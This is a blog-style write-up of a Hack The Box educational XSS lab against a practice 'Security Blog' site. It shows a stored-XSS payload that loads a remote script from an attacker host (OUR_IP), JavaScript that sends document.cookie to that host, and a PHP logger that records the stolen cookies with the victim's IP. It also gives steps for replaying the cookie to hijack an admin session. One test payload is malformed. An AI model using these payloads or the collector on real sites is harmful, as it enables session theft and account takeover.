+++
title = 'Web Application Security Check - XSS'
date = 2025-02-22
categories = ["CBBH"]
draft = false
+++

# Web Application Security Check - XSS

## Overview
This report is part of an educational lab in the XSS teaching module on Hack The Box (HTB). As part of our security check, we tested the Security Blog website for weaknesses. This report focuses on finding and testing Cross-Site Scripting (XSS) issues.

![blog](/images/XSS/xss_skills_assessment_website.jpg)
## Steps We Took

### 1. Finding a Weak Input Field
We checked the `/assessment` page for input fields that could be weak. We found that the **comment section** does not properly clean user input, making it open to XSS attacks.

#### What We Did:
1. Opened the Security Blog in a browser while connected to the VPN.
2. Found the comment box under a blog post. 
3. However, this introduces two issues:

    How can we know which specific field is vulnerable? Since any of the fields may execute our code, we can't know which of them did.
    How can we know what XSS payload to use? Since the page may be vulnerable, but the payload may not work?

   ![comment](/images/XSS/comment.png)

 we can write JavaScript code within the <script> tags, but we can also include a remote script by providing its URL, as follows:
Code: html

<script src="http://OUR_IP/script.js"></script>

4. Entered a simple XSS test:
   ```html
   <script>alert(http://OUR_IP/website)</script>
   ```
5. The script ran, proving that the website field is vulnerable to XSS.
   ![php](/images/XSS/website.png)



### 2. Running the XSS Attack
After finding the weak input field, we used a script to steal session cookies.

#### Script Used:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

#### How We Did It:
1. Created a JavaScript file (`script.js`) with this code:
   ```javascript
   new Image().src='http://OUR_IP/index.php?c='+document.cookie
   ```
2. Hosted `script.js` on our server.
3. Changed the XSS payload to:
   ```html
   <script src=http://OUR_IP/script.js></script>
   ```
4. Entered this script in the weak input field.
5. The script ran and sent the cookies to our server.



### 3. Collecting Stolen Cookies
We set up a simple PHP server to capture the stolen cookies.

#### PHP Code Used:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
    I got the above code from HTB.

#### Steps Taken:
1. Saved the PHP script as `index.php`.
2. Started a PHP server.
3. Once I sent the payload, the cooke came in with the flag.
   ![flag](/images/XSS/cookie.png)



### 4. Using the Stolen Cookies
for this lab we did not need to do this steps but With the stolen session cookies, we can  access the admin’s account and retrieved the flag.

#### if needed:
1. Copy the stolen session cookie.
2. we open Firefox Developer Tools:
   -  to `/assessment/login.php`.
   - Press **Shift+F9** to open **Storage**.
   - Clicked the `+` button to add a new cookie.
   - Enter the **Name** (before `=`) and **Value** (after `=`) from the stolen cookie.
3. Refresh the page to log in as the admin.
4. access the account.

#### Flag Found:
```
HTB{Example_Flag_12345}
```

The vulnrable Security Blog has an XSS issue that allows session hijacking. We used this weakness to steal an admin’s session cookie and retrieve a sensitive flag. 